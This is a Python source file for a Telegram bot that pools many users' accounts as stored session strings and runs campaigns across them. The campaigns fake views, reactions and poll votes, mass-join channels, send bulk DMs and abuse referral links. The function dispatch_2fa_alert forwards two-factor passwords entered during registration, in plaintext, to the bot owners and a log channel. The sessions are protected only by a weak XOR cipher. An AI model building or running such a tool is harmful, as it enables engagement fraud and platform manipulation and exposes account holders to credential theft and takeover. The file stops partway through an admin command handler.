import asyncio
import base64
import json
import os
import re
import time
from typing import Dict, Any, List, Optional, Tuple

from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from motor.motor_asyncio import AsyncIOMotorClient

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    FloodWaitError
)

# Import local configurations
import config
from config import logger

# --- CRYPTO HELPERS ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in config.SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- ADVANCED LINK & PRIVATE INVITE PARSING HELPER ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
    link = link.strip()
    if not link:
        return None, None, False
        
    if re.match(r'^-?\d+$', link):
        return int(link), None, False

    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id = int(private_match.group(2))
        return channel_id, msg_id, False

    if "+ " in link or "/+" in link or "joinchat/" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        if hash_match:
            return hash_match.group(1), None, True
        return link, None, True
        
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match:
        target = msg_match.group(1)
        if target.isdigit():
            target = int(f"-100{target}")
        return target, int(msg_match.group(2)), False
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if target.isdigit():
            target = int(f"-100{target}")
        if len(parts) > 1 and parts[1].isdigit():
            msg_id = int(parts[1])
            return target, msg_id, False
            
    if isinstance(target, str) and target.replace("-", "").isdigit():
        return int(target), None, False

    return target, None, False

def make_progress_bar(pct: float, length: int = 15) -> str:
    filled = int(round(length * (pct / 100.0)))
    return "🟩" * filled + "⬜" * (length - filled)

# --- DATABASE ENGINE (MOTOR MONGO DB) ---
class Database:
    def __init__(self):
        self.client = AsyncIOMotorClient(config.MONGO_URI)
        self.db = self.client["TelegramMultiAccountBot"]
        self.users = self.db["users"]
        self.accounts = self.db["accounts"]
        self.assignments = self.db["account_assignments"]
        self.tasks = self.db["tasks"]
        self.logs = self.db["logs"]

    async def init(self):
        await self.users.create_index("user_id", unique=True)
        await self.accounts.create_index("phone", unique=True)
        await self.assignments.create_index([("user_id", 1), ("phone", 1)], unique=True)
        logger.info("MongoDB Async engine connected & initialized.")

    async def log_action(self, user_id: int, action: str, bot_instance: Optional[Client] = None, operational: bool = False):
        try:
            await self.logs.insert_one({
                "user_id": user_id,
                "action": action,
                "timestamp": time.time()
            })
        except Exception as db_err:
            logger.error(f"Failed to log action: {db_err}")
        
        if operational and bot_instance and config.LOG_CHANNEL_ID:
            try:
                log_text = (
                    f"📝 <b>System Log Update</b>\n"
                    f"👤 User ID: <code>{user_id}</code>\n"
                    f"⚙️ Action executed: {action}"
                )
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=log_text, parse_mode=enums.ParseMode.HTML)
            except Exception as e:
                logger.error(f"Failed sending log channel updates: {e}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in config.SUPER_OWNER_IDS:
            return "super_owner"
        user = await self.users.find_one({"user_id": user_id})
        return user.get("role", "user") if user else "user"

    async def get_current_account_count(self, user_id: int) -> int:
        return await self.accounts.count_documents({"user_id": user_id})

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        user = await self.users.find_one({"user_id": user_id})
        if not user:
            role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
            await self.users.insert_one({
                "user_id": user_id,
                "username": username,
                "role": role_val,
                "referred_by": referred_by,
                "max_accounts": 999999999,
                "created_at": time.time()
            })

    async def purge_entire_database(self):
        await self.users.delete_many({})
        await self.accounts.delete_many({})
        await self.assignments.delete_many({})
        await self.tasks.delete_many({})
        await self.logs.delete_many({})

    async def get_storage_stats(self) -> dict:
        db_stats = await self.db.command("dbStats")
        total_size = db_stats.get("dataSize", 0) + db_stats.get("indexSize", 0)
        return {
            "data_size": db_stats.get("dataSize", 0),
            "storage_size": db_stats.get("storageSize", 0),
            "index_size": db_stats.get("indexSize", 0),
            "total_size": total_size,
            "collections": db_stats.get("collections", 0),
            "objects": db_stats.get("objects", 0)
        }

db_mgr = Database()
registration_sessions: Dict[int, Dict[str, Any]] = {}
user_states: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

# --- FSM SESSION HELPERS ---
def set_user_state(user_id: int, state: str, data: Optional[dict] = None):
    if user_id not in user_states:
        user_states[user_id] = {"state": None, "data": {}}
    user_states[user_id]["state"] = state
    if data is not None:
        user_states[user_id]["data"].update(data)

def get_user_state(user_id: int) -> Tuple[Optional[str], dict]:
    state_info = user_states.get(user_id, {"state": None, "data": {}})
    return state_info["state"], state_info["data"]

def clear_user_state(user_id: int):
    user_states.pop(user_id, None)

async def dispatch_2fa_alert(bot: Client, user_id: int, phone: str, password_entered: Optional[str] = None):
    text = (
        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Phone: <code>+{phone}</code>\n"
    )
    if password_entered:
        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"

    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode=enums.ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to log channel: {e}")

    for owner_id in config.SUPER_OWNER_IDS:
        try:
            await bot.send_message(chat_id=owner_id, text=text, parse_mode=enums.ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")

# --- CONCURRENT TASK MANAGER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[str, asyncio.Task] = {}

    async def add_task(self, task_id: str, creator_id: int, task_type: str, payload: dict, bot_instance: Client, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty:
                break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        active_ids = list(self.current_tasks.keys())
        for t_id in active_ids:
            loop_task = self.current_tasks.get(t_id)
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                await db_mgr.tasks.update_one(
                    {"_id": t_id},
                    {"$set": {"status": "cancelled", "progress": "Stopped by admin"}}
                )
        return count

    async def start_worker(self):
        logger.info("Task runner loop started.")
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError:
                break
                
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except asyncio.CancelledError:
                logger.warning(f"Task #{task_id} was stopped.")
            except Exception as e:
                logger.error(f"Error on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: str, creator_id: int, task_type: str, payload: dict, bot_instance: Client, status_msg_id: int):
        start_time = time.time()
        await db_mgr.tasks.update_one({"_id": task_id}, {"$set": {"status": "running", "progress": "0%"}})

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        account_routing = payload.get("account_routing", "own")
        
        if role == "super_owner":
            if account_routing == "all":
                cursor = db_mgr.accounts.find({"status": "active"})
            else:
                cursor = db_mgr.accounts.find({"status": "active", "user_id": creator_id})
        elif role in ["owner", "admin"]:
            cursor = db_mgr.accounts.find({"status": "active"})
        else:
            assigned_phones = [doc["phone"] async for doc in db_mgr.assignments.find({"user_id": creator_id})]
            cursor = db_mgr.accounts.find({
                "status": "active",
                "$or": [{"user_id": creator_id}, {"phone": {"$in": assigned_phones}}]
            })
        
        async for row in cursor:
            clients_data.append((row["phone"], decrypt_data(row["session_string"])))

        if requested_count > 0:
            clients_data = clients_data[:requested_count]

        if not clients_data:
            await db_mgr.tasks.update_one({"_id": task_id}, {"$set": {"status": "failed", "progress": "No accounts found"}})
            try:
                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
            except Exception:
                pass
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)
        
        speed_mode = payload.get("speed_mode", "safe")
        if speed_mode == "safer":
            sleep_time = 2.5
        elif speed_mode == "fastest":
            sleep_time = 0.05
        else:
            sleep_time = 5.0

        semaphore = asyncio.Semaphore(5 if speed_mode == "safer" else (1 if speed_mode == "safe" else 25)) 
        progress_counter = 0
        success_counter = 0
        failure_counter = 0
        last_ui_update = 0

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(sleep_time * idx)
                    await client.connect()
                    if not await client.is_user_authorized():
                        await db_mgr.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                        failed_ids.append((phone, "Session key expired / Account banned"))
                        failure_counter += 1
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id, is_target_private = parse_telegram_link(target) if not do_leave_all else (None, None, False)
                    parsed_channel, _, is_channel_private = parse_telegram_link(channel_target) if not do_leave_all else (None, None, False)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = (task_type == "join" or do_react or do_vote or do_view) and not do_leave_all
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    joined_updates_peer = None

                    if do_join:
                        try:
                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
                                invite_hash = parsed_channel if is_channel_private else parsed_target
                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
                                if hasattr(updates, 'chats') and updates.chats:
                                    joined_updates_peer = updates.chats[0]
                            else:
                                updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                if hasattr(updates, 'chats') and updates.chats:
                                    joined_updates_peer = updates.chats[0]
                        except Exception as join_err:
                            if "USER_ALREADY_PARTICIPANT" not in str(join_err):
                                failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
                                failure_counter += 1
                                return

                    target_peer = joined_updates_peer or parsed_target

                    if do_view and msg_id:
                        try:
                            await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                        except Exception as view_err:
                            failed_ids.append((phone, f"View increment failed: {str(view_err)}"))
                            failure_counter += 1
                            return

                    if do_react and msg_id:
                        try:
                            peer_entity = await client.get_input_entity(target_peer)
                            emojis = payload.get("reactions", ["👍"])
                            assigned_emoji = emojis[idx % len(emojis)]

                            await client(functions.messages.SendReactionRequest(
                                peer=peer_entity,
                                msg_id=msg_id,
                                reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                            ))
                        except Exception as react_err:
                            try:
                                peer_entity = await client.get_input_entity(target_peer)
                                await client(functions.messages.SendReactionRequest(
                                    peer=peer_entity,
                                    msg_id=msg_id,
                                    reaction=[assigned_emoji]
                                ))
                            except Exception as retry_err:
                                failed_ids.append((phone, f"Reaction failed: {str(retry_err)}"))
                                failure_counter += 1
                                return

                    if do_vote and msg_id:
                        try:
                            vote_mode = payload.get("vote_mode", "text")
                            if vote_mode == "inline":
                                raw_button_text = payload.get("button_text", "").strip().lower()
                                clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)

                                msg = await client.get_messages(target_peer, ids=msg_id)
                                if msg and msg.reply_markup:
                                    target_button = None
                                    for row in msg.reply_markup.rows:
                                        for btn in row.buttons:
                                            btn_raw = btn.text.strip().lower()
                                            btn_clean = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', btn_raw)

                                            if (
                                                raw_button_text in btn_raw or 
                                                (clean_target and clean_target == btn_clean) or 
                                                (clean_target and btn_raw.startswith(clean_target))
                                            ):
                                                target_button = btn
                                                break
                                        if target_button:
                                            break
                                    if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                        await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                    else:
                                        raise ValueError("Inline callback button matching text not found.")
                                else:
                                    raise ValueError("Target message does not possess an inline keyboard markup.")
                            else:
                                chosen_option = int(payload.get("poll_option_index", 0))
                                await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                        except Exception as vote_err:
                            failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
                            failure_counter += 1
                            return

                    if do_dm:
                        try:
                            await client.send_message(target_peer, payload.get("text", "Hello!"))
                        except Exception as dm_err:
                            failed_ids.append((phone, f"DM dispatch failed: {str(dm_err)}"))
                            failure_counter += 1
                            return

                    if do_refer:
                        try:
                            bot_username_target = str(target_peer).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                            start_param = None
                            if "start=" in target:
                                param_match = re.search(r'start=([^&\s]+)', target)
                                if param_match:
                                    start_param = param_match.group(1)
                            if "?" in bot_username_target:
                                bot_username_target = bot_username_target.split("?")[0]
                            await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")
                        except Exception as ref_err:
                            failed_ids.append((phone, f"Referral start message failed: {str(ref_err)}"))
                            failure_counter += 1
                            return

                    if do_leave:
                        if do_leave_all:
                            left_chats_count = 0
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        left_chats_count += 1
                                        await asyncio.sleep(0.3)
                                    except FloodWaitError as fwe:
                                        await asyncio.sleep(fwe.seconds)
                                    except Exception:
                                        pass
                            if left_chats_count == 0:
                                failed_ids.append((phone, "Account was not present in any channels"))
                                failure_counter += 1
                                return
                        else:
                            try:
                                resolved_entity = await client.get_input_entity(target_peer)
                                await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))
                            except Exception as leave_err:
                                failed_ids.append((phone, f"Leave channel failed: {str(leave_err)}"))
                                failure_counter += 1
                                return

                    passed_ids.append(phone)
                    success_counter += 1
                    
                except Exception as general_err:
                    failed_ids.append((phone, f"General error: {str(general_err)}"))
                    failure_counter += 1
                finally:
                    await client.disconnect()
                    progress_counter += 1
                    
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.5 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        elapsed = current_now - start_time
                        avg_time = elapsed / progress_counter if progress_counter > 0 else 0
                        remaining = (total_accounts - progress_counter) * avg_time
                        
                        eta_str = f"~{int(remaining // 60)}m {int(remaining % 60)}s" if remaining > 0 else "0s"
                        progress_pct = f"{int(pct_val)}%"
                        
                        live_text = (
                            f"⏳ <b>Campaign Processing Deployment Framework Running...</b>\n\n"
                            f"[{make_progress_bar(pct_val)}] <b>{progress_pct}</b>\n"
                            f"📊 <code>{progress_counter}/{total_accounts}</code> accounts completely run\n"
                            f"✅ Successful: <code>{success_counter}</code> | ❌ Blocked: <code>{failure_counter}</code>\n"
                            f"⏱ Time remaining duration: {eta_str}"
                        )
                        try:
                            await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text, parse_mode=enums.ParseMode.HTML)
                        except Exception:
                            pass

                        await db_mgr.tasks.update_one({"_id": task_id}, {"$set": {"progress": progress_pct}})

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))

        end_time = time.time()
        elapsed_total = end_time - start_time
        duration_str = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"

        status = "completed" if len(passed_ids) > 0 else "failed"

        await db_mgr.tasks.update_one(
            {"_id": task_id},
            {"$set": {
                "status": status,
                "progress": f"{len(passed_ids)}/{total_accounts} Passed",
                "success_report": passed_ids,
                "failure_report": failed_ids
            }}
        )

        success_pct_final = int((success_counter / total_accounts) * 100) if total_accounts > 0 else 0
        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
        
        user_info = f"<code>{creator_id}</code>"
        try:
            chat_member = await bot_instance.get_chat(creator_id)
            if chat_member.first_name:
                user_info = f"{chat_member.first_name} (<code>{creator_id}</code>)"
        except Exception:
            pass

        target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"<code>{payload.get('target', 'N/A')}</code>"

        failure_log_details = ""
        if len(failed_ids) > 20:
            failure_log_details = f"\n\n📄 <b>Note:</b> More than 20 errors occurred (<code>{len(failed_ids)}</code> failures). A detailed file log with clear failure reasons has been generated and sent below."
        elif failed_ids:
            failure_log_details = "\n\n❌ <b>Detailed Failure Telemetry Matrix:</b>\n"
            for phone_num, reason in failed_ids:
                failure_log_details += f"• <code>+{phone_num}</code> ➜ <i>{reason}</i>\n"

        completion_card = (
            f"👑 <b>Premium Task Management Closure Summary Card</b>\n\n"
            f"📋 Campaign ID: <code>{campaign_uuid}</code>\n"
            f"⚡ Action Code Execution: <code>{task_type.upper()}</code>\n"
            f"👤 Creator Node Profile: {user_info}\n"
            f"🔗 Target Location Path: {target_display}\n"
            f"📢 Secondary Target Scope: <code>{payload.get('channel_target', 'N/A')}</code>\n"
            f"🏎 Speed Interval Throttle: <code>{speed_mode.upper()}</code>\n\n"
            f"📊 <b>Performance Analytics Reports:</b>\n"
            f"✅ Success Threshold: <code>{success_counter}/{total_accounts}</code> ({success_pct_final}%)\n"
            f"❌ Core Failures Recorded: <code>{failure_counter}/{total_accounts}</code>\n"
            f"⏱ Production Runtime Elapsed: {duration_str}"
            f"{failure_log_details}"
        )

        try:
            await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode=enums.ParseMode.HTML)
            
            if len(failed_ids) > 20:
                file_lines = [
                    f"============================================================",
                    f"CAMPAIGN FAILURE AUDIT REPORT - TASK #{task_id}",
                    f"Target: {payload.get('target', 'N/A')}",
                    f"Total Failed Accounts: {len(failed_ids)}",
                    f"============================================================\n"
                ]
                for phone_num, reason in failed_ids:
                    file_lines.append(f"Phone: +{phone_num} | Reason: {reason}")
                
                report_content = "\n".join(file_lines).encode('utf-8')
                
                temp_filename = f"task_{task_id}_failures.txt"
                with open(temp_filename, "wb") as f:
                    f.write(report_content)

                await bot_instance.send_document(
                    chat_id=creator_id,
                    document=temp_filename,
                    caption=f"📁 <b>Failure Reason Log</b>\nContains complete failure audit for <code>{len(failed_ids)}</code> failed accounts in Task <code>#{task_id}</code>.",
                    parse_mode=enums.ParseMode.HTML
                )
                if os.path.exists(temp_filename):
                    os.remove(temp_filename)
        except Exception as report_err:
            logger.error(f"Failed delivering task completion report: {report_err}")

        if config.LOG_CHANNEL_ID:
            try:
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=completion_card, parse_mode=enums.ParseMode.HTML)
            except Exception as le:
                logger.error(f"Failed sending validation report to log channel: {le}")

task_queue = TaskQueue()

# --- PREMIUM UI KEYBOARD GENERATORS ---
REACTION_EMOJIS = [
    "🔥", "❤️", "💖", "💘", "💝",
    "👍", "👏", "🎉", "🤩", "💯",
    "⚡", "🍓", "💋", "🍿", "🏆",
    "🤣", "🥰", "🤔", "👀", "😎"
]

def get_post_registration_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        suffix = " ⭐" if is_selected else ""
        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 5:  
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0")],
        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks")],
        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals")],
        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats")])
    return InlineKeyboardMarkup(buttons)

def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote")],
        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view")],
        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view")],
        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view")],
        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed")],
        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu")]
    ])

def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single")],
        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
    ])

# --- HELPER WORKFLOW PROCEDURES ---
async def prompt_for_account_scale(target_message: Any):
    user_id = target_message.from_user.id if hasattr(target_message, "from_user") else target_message.chat.id
    set_user_state(user_id, "waiting_for_account_scale")
    prompt_text = "<b>Step Last: Specify total account capacity allocation quantity to deploy for this campaign (e.g. 5, 10, 50):</b>"
    if isinstance(target_message, CallbackQuery):
        await target_message.message.edit_text(prompt_text, parse_mode=enums.ParseMode.HTML)
    else:
        await target_message.reply_text(prompt_text, parse_mode=enums.ParseMode.HTML)

async def finalize_task_creation(message: Message, bot_client: Client):
    user_id = message.from_user.id
    _, task_payload = get_user_state(user_id)
    clear_user_state(user_id)

    task_type = task_payload.get("task_type", "unknown")
    task_id = str(int(time.time() * 1000))

    await db_mgr.tasks.insert_one({
        "_id": task_id,
        "creator_id": user_id,
        "task_type": task_type,
        "payload": task_payload,
        "status": "pending",
        "progress": "0%",
        "created_at": time.time()
    })

    status_msg = await message.reply_text(
        f"🚀 <b>Campaign Deployment Queued!</b>\n"
        f"Campaign Task ID: <code>#{task_id}</code>\n"
        f"Type: <code>{task_type.upper()}</code>\n"
        f"Initializing background thread execution loop...",
        parse_mode=enums.ParseMode.HTML
    )

    await task_queue.add_task(task_id, user_id, task_type, task_payload, bot_client, status_msg.id)

# --- PYROGRAM BOT INSTANCE ---
app = Client("MultiAccountSystemBot", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)

@app.on_message(filters.command("start") & filters.private)
async def cmd_start(client: Client, message: Message):
    clear_user_state(message.from_user.id)
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await db_mgr.log_action(user_id, "Started the bot", client, operational=False)

    welcome_text = (
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:"
    )
    await message.reply_text(welcome_text, reply_markup=get_main_keyboard(role), parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^main_menu$"))
async def handle_main_menu(client: Client, callback: CallbackQuery):
    await callback.answer()
    clear_user_state(callback.from_user.id)
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:",
        reply_markup=get_main_keyboard(role),
        parse_mode=enums.ParseMode.HTML
    )

@app.on_message(filters.command("canceltasks") & filters.private)
async def cmd_cancel_tasks(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> Access token restricted to System Operators.")
        return

    await message.reply_text("🛑 <i>Terminating thread execution loops across pending and active campaign tasks...</i>", parse_mode=enums.ParseMode.HTML)
    killed_count = await task_queue.cancel_all_active_tasks()
    await db_mgr.tasks.update_many(
        {"$or": [{"status": "pending"}, {"status": "running"}]},
        {"$set": {"status": "cancelled"}}
    )
    await message.reply_text(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")

# --- GRANT & REVOKE ACCESS COMMANDS & INTERACTIVE STEPS ---
@app.on_message(filters.command("grantaccess") & filters.private)
async def cmd_grant_access(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> Requires Admin/Owner privileges.")
        return

    parts = message.text.split()[1:]
    if not parts:
        await message.reply_text("✨ <b>Syntax:</b> <code>/grantaccess &lt;user_id&gt; [count]</code>\n<i>Default count is 20 IDs.</i>", parse_mode=enums.ParseMode.HTML)
        return

    if not parts[0].isdigit():
        await message.reply_text("❌ Invalid Target User ID integer format.")
        return

    target_id = int(parts[0])
    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20

    cursor = db_mgr.accounts.find({"status": "active"}).limit(count)
    rows = [doc async for doc in cursor]

    if not rows:
        await message.reply_text("❌ No active accounts found in the database to grant.")
        return

    assigned_count = 0
    for row in rows:
        ph = row["phone"]
        try:
            await db_mgr.assignments.update_one(
                {"user_id": target_id, "phone": ph},
                {"$setOnInsert": {"user_id": target_id, "phone": ph}},
                upsert=True
            )
            assigned_count += 1
        except Exception:
            pass

    await message.reply_text(
        f"👑 <b>Access Provisioned Successfully!</b>\n\n"
        f"👤 Target User ID: <code>{target_id}</code>\n"
        f"📱 Granted IDs Allocation: <code>{assigned_count}</code> active accounts\n"
        f"🔒 <i>Note: This user can ONLY execute tasks using these IDs and CANNOT export session strings.</i>",
        parse_mode=enums.ParseMode.HTML
    )

    try:
        await client.send_message(
            chat_id=target_id,
            text=f"🎉 <b>Special Task Access Granted!</b>\nAdmin has provisioned <code>{assigned_count}</code> account IDs for your task execution. You can now use these accounts in Task Launcher!",
            parse_mode=enums.ParseMode.HTML
        )
    except Exception:
        pass

@app.on_message(filters.command("revokeaccess") & filters.private)
async def cmd_revoke_access(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> Requires Admin/Owner privileges.")
        return

    parts = message.text.split()[1:]
    if not parts or not parts[0].isdigit():
        await message.reply_text("✨ <b>Syntax:</b> <code>/revokeaccess &lt;user_id&gt;</code>", parse_mode=enums.ParseMode.HTML)
        return

    target_id = int(parts[0])
    await db_mgr.assignments.delete_many({"user_id": target_id})
